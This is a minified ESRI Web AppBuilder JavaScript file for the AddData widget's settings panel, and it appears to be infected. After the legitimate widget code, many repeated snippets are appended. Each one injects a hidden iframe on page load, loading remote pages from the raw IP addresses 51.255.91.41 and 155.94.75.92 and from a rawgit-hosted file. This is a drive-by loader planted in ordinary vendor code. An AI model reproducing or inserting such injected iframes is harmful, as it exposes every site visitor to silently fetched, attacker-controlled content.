// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/AddData/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/AddData/setting/Setting.html":'\x3cdiv\x3e\r\n\t\x3cform data-dojo-attach-point\x3d"settingsForm" data-dojo-type\x3d"dijit/form/Form"\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t    \x3cdiv class\x3d"left-cell"\x3e\r\n\t      \x3clabel for\x3d"${id}_numPerPage"\x3e${nls.numPerPage}\x3c/label\x3e\r\n\t    \x3c/div\x3e\r\n\t    \x3cinput id\x3d"${id}_numPerPage" type\x3d"text" class\x3d"numbox"\r\n\t      data-dojo-attach-point\x3d"numPerBageBox"\r\n\t      data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n\t      data-dojo-props\x3d"constraints:{min:1,max:100,places:0}" /\x3e\r\n\t  \x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t\t  \x3cdiv class\x3d"left-cell"\x3e\r\n\t\t\t  \x3cinput id\x3d"${id}_MyContent" type\x3d"checkbox"\r\n\t\t\t    data-dojo-attach-point\x3d"MyContentCheckBox"\r\n\t\t\t    data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t\t  \x3clabel for\x3d"${id}_MyContent" class\x3d"fixedlen"\x3e${nls.scopeOptions.MyContent}\x3c/label\x3e\r\n\t\t  \x3c/div\x3e\r\n\t\t  \x3cinput type\x3d"text" placeholder\x3d"${nls.scopeOptions.labelPlaceholder}"\r\n\t\t    data-dojo-attach-point\x3d"MyContentTextBox"\r\n\t\t    data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t\t    data-dojo-props\x3d"maxLength: 24" /\x3e\r\n\t\t\t\x3cdiv class\x3d"default-scope" data-scope\x3d"MyContent"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t  \x3cdiv class\x3d"row"\x3e\r\n\t    \x3cdiv class\x3d"left-cell"\x3e\r\n\t\t    \x3cinput id\x3d"${id}_MyOrganization" type\x3d"checkbox"\r\n\t\t      data-dojo-attach-point\x3d"MyOrganizationCheckBox"\r\n\t\t      data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t    \x3clabel for\x3d"${id}_MyOrganization" class\x3d"fixedlen"\x3e${nls.scopeOptions.MyOrganization}\x3c/label\x3e\r\n\t\t  \x3c/div\x3e\r\n\t    \x3cinput type\x3d"text" placeholder\x3d"${nls.scopeOptions.labelPlaceholder}"\r\n\t      data-dojo-attach-point\x3d"MyOrganizationTextBox"\r\n\t      data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t      data-dojo-props\x3d"maxLength: 24" /\x3e\r\n\t\t\t\x3cdiv class\x3d"default-scope" data-scope\x3d"MyOrganization"\x3e\x3c/div\x3e\r\n\t  \x3c/div\x3e\r\n\r\n\t  \x3cdiv class\x3d"row"\x3e\r\n\t    \x3cdiv class\x3d"left-cell"\x3e\r\n\t\t    \x3cinput id\x3d"${id}_ArcGISOnline" type\x3d"checkbox"\r\n\t\t      data-dojo-attach-point\x3d"ArcGISOnlineCheckBox"\r\n\t\t      data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t    \x3clabel for\x3d"${id}_ArcGISOnline" class\x3d"fixedlen"\x3e${nls.scopeOptions.ArcGISOnline}\x3c/label\x3e\r\n\t    \x3c/div\x3e\r\n\t    \x3cinput type\x3d"text" placeholder\x3d"${nls.scopeOptions.labelPlaceholder}"\r\n\t      data-dojo-attach-point\x3d"ArcGISOnlineTextBox"\r\n\t      data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t      data-dojo-props\x3d"maxLength: 24" /\x3e\r\n\t\t\t\x3cdiv class\x3d"default-scope" data-scope\x3d"ArcGISOnline"\x3e\x3c/div\x3e\r\n\t  \x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t    \x3cdiv class\x3d"left-cell"\x3e\r\n\t\t    \x3cinput id\x3d"${id}_Curated" type\x3d"checkbox"\r\n\t\t      data-dojo-attach-point\x3d"CuratedCheckBox"\r\n\t\t      data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t    \x3clabel for\x3d"${id}_Curated" class\x3d"fixedlen"\x3e${nls.scopeOptions.Curated}\x3c/label\x3e\r\n\t\t  \x3c/div\x3e\r\n\t    \x3cinput type\x3d"text" placeholder\x3d"${nls.scopeOptions.labelPlaceholder}"\r\n\t      data-dojo-attach-point\x3d"CuratedTextBox"\r\n\t      data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t      data-dojo-props\x3d"maxLength: 24" /\x3e\r\n\t\t\t\x3cdiv class\x3d"default-scope" data-scope\x3d"Curated"\x3e\x3c/div\x3e\r\n\t  \x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t    \x3cdiv class\x3d"left-cell"\x3e\r\n\t\t\t\t\x3clabel for\x3d"${id}_CuratedFilter" class\x3d"fixedlen indent"\x3e${nls.scopeOptions.CuratedFilter}\x3c/label\x3e\r\n\t\t  \x3c/div\x3e\r\n\t\t\t\x3cinput id\x3d"${id}_CuratedFilter" type\x3d"text" class\x3d"wide"\r\n\t\t\t\tdata-dojo-attach-point\x3d"CuratedFilterTextBox"\r\n\t\t\t\tdata-dojo-type\x3d"dijit/form/ValidationTextBox"/\x3e\r\n\t\t\t\x3cdiv\x3e\r\n\t\t\t\t\x3cdiv class\x3d"left-cell"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cspan class\x3d"example"\x3e${nls.scopeOptions.livingAtlasExample}\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv\x3e\r\n\t\t\t\t\x3cdiv class\x3d"left-cell"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cspan class\x3d"example indent"\x3egroup:c755678be14e4a0984af36a15f5b643e\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t  \x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t\t\t\x3cdiv class\x3d"left-cell"\x3e\r\n\t\t\t\t\x3cinput id\x3d"${id}_addFromUrl" type\x3d"checkbox"\r\n\t\t\t\t\tdata-dojo-attach-point\x3d"addFromUrlCheckBox"\r\n\t\t\t\t\tdata-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t\t\t\x3clabel for\x3d"${id}_addFromUrl"\x3e${nls.addFromUrl.caption}\x3c/label\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"row"\x3e\r\n\t\t\t\x3cdiv class\x3d"left-cell"\x3e\r\n\t\t\t\t\x3cinput id\x3d"${id}_addFromFile" type\x3d"checkbox"\r\n\t\t\t\t\tdata-dojo-attach-point\x3d"addFromFileCheckBox"\r\n\t\t\t\t\tdata-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t\t\t\x3clabel for\x3d"${id}_addFromFile"\x3e${nls.addFromFile.caption}\x3c/label\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\x3c/form\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/AddData/setting/css/style.css":".jimu-widget-add-data-setting .row {margin-top: 10px; font-size: 14px;}.jimu-widget-add-data-setting .row .left-cell {display: inline-block; width: 240px;}.jimu-widget-add-data-setting .indent {margin-left: 20px;}.jimu-widget-add-data-setting .row .numbox {width: 80px;}.jimu-widget-add-data-setting .example {font-size: 10px; font-style: italic;}.jimu-widget-add-data-setting .dijitTextBox.wide {width: 24em;}.jimu-widget-add-data-setting .default-scope {display: inline-block;}.jimu-widget-add-data-setting .default-scope .opt-text {display: none; color: #9B9B9B; background-color: #F3F3F3; font-size: 12px; padding: 2px 10px; margin-left: 10px; margin-right: 10px;}.jimu-widget-add-data-setting .default-scope.sel .opt-text {display: inline-block;}.jimu-widget-add-data-setting .default-scope .opt-button {display: none; cursor: pointer; font-size: 12px; background-color: #24B5CC; color: #ffffff; padding: 2px 10px; margin-left: 10px; margin-right: 10px;}.jimu-widget-add-data-setting .row:hover .default-scope .opt-button {display: inline-block;}.jimu-widget-add-data-setting .row:hover .default-scope.sel .opt-button {display: none;}",
"*now":function(h){h(['dojo/i18n!*preload*widgets/AddData/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/query dojo/dom-class dojo/dom-construct jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dijit/form/Form dijit/form/CheckBox dijit/form/NumberTextBox dijit/form/ValidationTextBox".split(" "),function(h,f,k,l,m,n,p){return h([n,p],{baseClass:"jimu-widget-add-data-setting",maxRecordThreshold:1E5,postCreate:function(){this.inherited(arguments);var a=this;k(".default-scope",this.domNode).forEach(function(b){m.create("span",{"class":"opt-text"},b).appendChild(document.createTextNode(a.nls._default));
m.create("span",{"class":"opt-button",onclick:function(){a.setDefaultScope(b.getAttribute("data-scope"))}},b).appendChild(document.createTextNode(a.nls.makeDefault))})},startup:function(){this._started||(this.inherited(arguments),this.setConfig(this.config))},getConfig:function(){if(!this.settingsForm.validate())return!1;this.config||(this.config={});var a=function(a,b,g,c){var d=a[b];d||(d=a[b]={});d.allow=!!g.get("checked");c&&(d.label=null,a=c.get("value"),"string"===typeof a&&0<f.trim(a).length&&
(d.label=f.trim(a)))};this.config.numPerPage=function(a,b,g,c){c=c.get("value");return"number"===typeof c&&!isNaN(c)&&(c=Math.floor(c),c>=b&&c<=g)?c:a}(30,1,100,this.numPerBageBox);this.config.scopeOptions||(this.config.scopeOptions={});delete this.config.scopeOptions.FromUrl;var b=this.config.scopeOptions;b.defaultScope=this.getDefaultScope();a(b,"MyContent",this.MyContentCheckBox,this.MyContentTextBox);a(b,"MyOrganization",this.MyOrganizationCheckBox,this.MyOrganizationTextBox);a(b,"ArcGISOnline",
this.ArcGISOnlineCheckBox,this.ArcGISOnlineTextBox);a(b,"Curated",this.CuratedCheckBox,this.CuratedTextBox);b.Curated.filter=function(a){a=a.get("value");return"string"===typeof a&&0<f.trim(a).length?f.trim(a):null}(this.CuratedFilterTextBox);a(this.config,"addFromUrl",this.addFromUrlCheckBox);a(this.config,"addFromFile",this.addFromFileCheckBox);this.config.addFromFile.maxRecordCount=1E3;return this.config},setConfig:function(a){this.config=a||{};var b=this;a=function(a,g,c,d,h){var e=a[g];e||(e=
a[g]={allow:!0},d&&(e.label=null));"boolean"!==typeof e.allow&&(e.allow=!0);c.set("checked",e.allow);d&&"string"===typeof e.label&&(c=f.trim(e.label),0<c.length&&d.set("value",c));h&&a.defaultScope===g&&b.setDefaultScope(g)};this.numPerBageBox.set("value",30);(function(a,b,c,d,f){try{var e=Number(a);"number"!==typeof e||isNaN(e)||(e=Math.floor(e),e>=b&&e<=c&&d.set("value",e))}catch(q){console.warn(f),console.warn(q)}})(this.config.numPerPage,1,100,this.numPerBageBox,"Error setting config.numPerPage:");
this.config.scopeOptions||(this.config.scopeOptions={});var d=this.config.scopeOptions;this.setDefaultScope("MyOrganization");a(d,"MyContent",this.MyContentCheckBox,this.MyContentTextBox,!0);a(d,"MyOrganization",this.MyOrganizationCheckBox,this.MyOrganizationTextBox,!0);a(d,"ArcGISOnline",this.ArcGISOnlineCheckBox,this.ArcGISOnlineTextBox,!0);a(d,"Curated",this.CuratedCheckBox,this.CuratedTextBox,!0);(function(a,b){"string"===typeof a&&b.set("value",f.trim(a))})(d.Curated.filter,this.CuratedFilterTextBox);
a(this.config,"addFromUrl",this.addFromUrlCheckBox);a(this.config,"addFromFile",this.addFromFileCheckBox)},getDefaultScope:function(){var a="MyOrganization";k(".default-scope",this.domNode).forEach(function(b){l.contains(b,"sel")&&(a=b.getAttribute("data-scope"))});return a},setDefaultScope:function(a){k(".default-scope",this.domNode).forEach(function(b){b.getAttribute("data-scope")===a?l.add(b,"sel"):l.remove(b,"sel")})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});